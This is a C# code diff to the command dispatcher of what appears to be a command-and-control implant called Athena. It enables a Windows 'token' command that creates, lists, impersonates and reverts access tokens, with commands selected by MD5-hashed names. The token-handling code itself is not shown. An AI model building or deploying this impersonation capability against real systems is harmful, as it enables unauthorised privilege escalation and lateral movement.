@@ -13,10 +13,6 @@ using System.Text;
 using PluginBase;
 using Newtonsoft.Json;
 
-#if WINBUILD
-using System.Security.Principal;
-#endif
-
 namespace Athena.Commands
 {
     public class CommandHandler
@@ -67,7 +63,7 @@ namespace Athena.Commands
             job.started = true;
 
 #if WINBUILD
-            this.tokenHandler.ThreadImpersonate();
+            await this.tokenHandler.ThreadImpersonate();
 #endif
             switch (Misc.CreateMD5(job.task.command.ToLower())) //To lower "just in case"
             {
@@ -156,38 +152,38 @@ namespace Athena.Commands
                     this.activeJobs.Remove(task.id, out _);
                     break;
 #if WINBUILD
-                //case "94A08DA1FECBB6E8B46990538C7B50B2": //token
-                //    var tokenInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
-                //    string action = (string)tokenInfo["action"];
+                case "94A08DA1FECBB6E8B46990538C7B50B2": //token
+                    var tokenInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
+                    string action = (string)tokenInfo["action"];
 
-                //    if (action == "create")
-                //    {
-                //        this.responseResults.Add(await this.tokenHandler.CreateToken(job));
-                //    }
-                //    else if (action == "list")
-                //    {
-                //        this.responseResults.Add(await this.tokenHandler.ListTokens(job));
-                //    }
-                //    else if (action == "impersonate")
-                //    {
-                //        this.responseResults.Add(await this.tokenHandler.SetToken(job));
-                //    }
-                //    else if (action == "revert")
-                //    {
-                //        this.responseResults.Add(await this.tokenHandler.RevertToSelf(job));
-                //    }
-                //    else
-                //    {
-                //        this.responseResults.Add(new ResponseResult()
-                //        {
-                //            user_output = "Invalid action",
-                //            completed = "true",
-                //            task_id = job.task.id,
-                //            status = "error"
-                //        });
-                //    }
-                //    this.activeJobs.Remove(task.id, out _);
-                //    break;
+                    if (action == "create")
+                    {
+                        this.responseResults.Add(await this.tokenHandler.CreateToken(job));
+                    }
+                    else if (action == "list")
+                    {
+                        this.responseResults.Add(await this.tokenHandler.ListTokens(job));
+                    }
+                    else if (action == "impersonate")
+                    {
+                        this.responseResults.Add(await this.tokenHandler.SetToken(job));
+                    }
+                    else if (action == "revert")
+                    {
+                        this.responseResults.Add(await this.tokenHandler.RevertToSelf(job));
+                    }
+                    else
+                    {
+                        this.responseResults.Add(new ResponseResult()
+                        {
+                            user_output = "Invalid action",
+                            completed = "true",
+                            task_id = job.task.id,
+                            status = "error"
+                        });
+                    }
+                    this.activeJobs.Remove(task.id, out _);
+                    break;
 #endif
                 case "695630CFC5EB92580FB3E76A0C790E63": //unlink
                     StopInternalForwarder(job);
@@ -208,7 +204,7 @@ namespace Athena.Commands
                     break;
             }
 #if WINBUILD
-            this.tokenHandler.ThreadRevert();
+            await this.tokenHandler.ThreadRevert();
 #endif
         }
         /// <summary>
